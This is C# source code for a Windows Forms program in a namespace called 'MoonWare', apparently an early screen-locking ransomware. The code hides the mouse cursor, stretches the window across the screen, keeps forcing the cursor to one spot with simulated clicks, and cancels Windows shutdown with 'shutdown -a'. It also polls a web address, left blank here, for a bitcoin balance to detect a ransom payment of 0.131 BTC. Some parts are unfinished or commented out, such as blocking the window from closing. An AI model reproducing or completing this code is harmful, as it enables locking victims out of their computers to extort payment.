using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Drawing;

namespace MoonWare
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        static extern void mouse_event(uint dwFlags);

        public Form1()
        {
            InitializeComponent();
            Cursor.Hide();
        }
        private void Form1_Load(object sender, EventArgs e)
        {

        }
        bool firstRun = true;
        Point cursorPos = new Point(Screen.PrimaryScreen.WorkingArea.Size.Width / 2, Screen.PrimaryScreen.WorkingArea.Size.Height / 2);
        private void timer1_Tick(object sender, EventArgs e)
        {
            if (firstRun)
            {
                Size size = Screen.PrimaryScreen.Bounds.Size;
                size.Height -= 10;
                size.Width -= 10;
                this.Size = size;
                this.Location = new Point(0, 0);
                this.textBox1.Size = new Size(new Point(this.Size.Width / 2 - 12, textBox1.Size.Height));
                textBox1.Location = new Point(this.Size.Width - textBox1.Size.Width - 12, this.Size.Height - textBox1.Size.Height - 12);
                textBox1.Visible = true;
                Cursor.Position = cursorPos;
                mouse_event(0x002 | 0x004);
            }
            Cursor.Position = cursorPos;
        }

        private void preventclose(object sender, FormClosingEventArgs e)
        {
            //e.Cancel = !payed;
            if(e.CloseReason == CloseReason.WindowsShutDown)
            {
                Process.Start("shutdown", "-a");
            }
        }

        private void KeyPressedAction(object sender, KeyEventArgs e)
        {
            //e.SuppressKeyPress = true;
            System.Threading.Thread.Sleep(666);
            Cursor.Position = cursorPos;
            mouse_event(0x002 | 0x004);
        }
        double oldBTC = double.MinValue;
        double price = 0.131;
        bool payed = false;
        private void paymentTMR_Tick(object sender, EventArgs e)
        {
            try
            {//
                WebClient webClient = new WebClient();
                string download = webClient.DownloadString("");
                double currentBTC = double.MinValue;
                if (!double.TryParse(download, out currentBTC))
                    return;
                currentBTC = currentBTC / 100000000;
                if (oldBTC != currentBTC)
                {
                    if (oldBTC + price == currentBTC)
                    {
                        payed = true;
                        //Payed
                    }
                    else
                        oldBTC = currentBTC;
                }
            }
            catch { }
        }
    }
}
